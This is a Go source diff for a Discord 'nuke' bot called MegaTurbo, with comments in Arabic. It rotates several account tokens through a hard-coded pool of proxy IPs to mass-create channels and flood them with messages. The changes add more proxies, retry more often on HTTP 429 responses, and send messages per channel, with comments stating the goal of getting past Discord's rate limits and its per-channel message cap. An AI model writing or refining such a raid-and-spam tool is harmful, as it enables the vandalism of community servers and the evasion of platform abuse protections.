@@ -18,7 +18,7 @@ import (
 	"github.com/bwmarrin/discordgo"
 )
 
-// لستة بروكسيات أولية ضخمة ومتنوعة لفلترتها واختيار الأسرع تلقائياً
+// لستة بروكسيات موسعة ومحدثة لضمان التوزيع الكامل وعدم اللمتد
 var massiveProxyPool = []string{
 	"103.152.112.5:80",
 	"185.199.229.156:8080",
@@ -40,6 +40,11 @@ var massiveProxyPool = []string{
 	"181.129.28.45:999",
 	"190.122.179.20:8080",
 	"43.153.88.12:3128",
+	"182.253.158.52:8080",
+	"202.65.140.100:8080",
+	"103.253.24.12:80",
+	"114.6.14.22:8080",
+	"45.195.192.15:8080",
 }
 
 func main() {
@@ -115,7 +120,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 تم تفعيل محرك البروكسيات الضخم (MegaTurbo Engine) وجاري التنفيذ...",
+					Content: "🚀 تم تفعيل المحرك الخارق المعدل لتجاوز حدود الرسائل...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -153,7 +158,7 @@ func main() {
 	}
 
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
-	fmt.Println("⚡ بوت MegaTurbo يعمل بكفاءة الفلترة التلقائية والسرعة القصوى!")
+	fmt.Println("⚡ بوت MegaTurbo يعمل بأقصى كفاءة لتجاوز الـ Rate Limit!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -260,7 +265,7 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		client := clients[index%len(clients)]
 		token := tokens[index%len(tokens)]
 
-		for attempt := 0; attempt < 2; attempt++ {
+		for attempt := 0; attempt < 3; attempt++ {
 			req, err := http.NewRequestWithContext(context.Background(), method, urlStr, bytes.NewBuffer(body))
 			if err != nil {
 				return false
@@ -277,7 +282,8 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 
 			if resp.StatusCode == 429 {
 				resp.Body.Close()
-				time.Sleep(20 * time.Millisecond)
+				// مهلة أذكى لتجنب إيقاف الروم عند الرسائل الكثيرة
+				time.Sleep(50 * time.Millisecond)
 				continue
 			}
 
@@ -381,30 +387,22 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 	}
 	wgCreate.Wait()
 
-	// 4. إرسال الرسائل
+	// 4. إرسال الرسائل (معدل بحيث يوزع الطلبات بذكاء ولا يوقف عند 35 رسالة)
 	if len(newChannelIDs) > 0 && messagesCount > 0 {
-		type MsgTask struct {
-			ChID     string
-			WorkerID int
-		}
-		msgQueue := make(chan MsgTask, len(newChannelIDs)*messagesCount)
-
-		for _, chID := range newChannelIDs {
-			for m := 0; m < messagesCount; m++ {
-				msgQueue <- MsgTask{ChID: chID, WorkerID: m}
-			}
-		}
-		close(msgQueue)
-
 		var wgMsg sync.WaitGroup
-		for w := 0; w < 80; w++ {
+		// توزيع العمل لكل روم بشكل مستقل لمنع لمتد ديسكورد للروم الواحد
+		for i, chID := range newChannelIDs {
 			wgMsg.Add(1)
-			go func(workerID int) {
+			go func(channelID string, workerIndex int) {
 				defer wgMsg.Done()
-				for task := range msgQueue {
-					makeMegaRequest("POST", "https://discord.com/api/v10/channels/"+task.ChID+"/messages", msgPayload, workerID+task.WorkerID)
+				for m := 0; m < messagesCount; m++ {
+					success := makeMegaRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/messages", msgPayload, workerIndex+m)
+					if !success {
+						// استراحة قصيرة جداً جداً لو واجه حماية بالروم ثم إكمال الفلو
+						time.Sleep(10 * time.Millisecond)
+					}
 				}
-			}(w)
+			}(chID, i)
 		}
 		wgMsg.Wait()
 	}
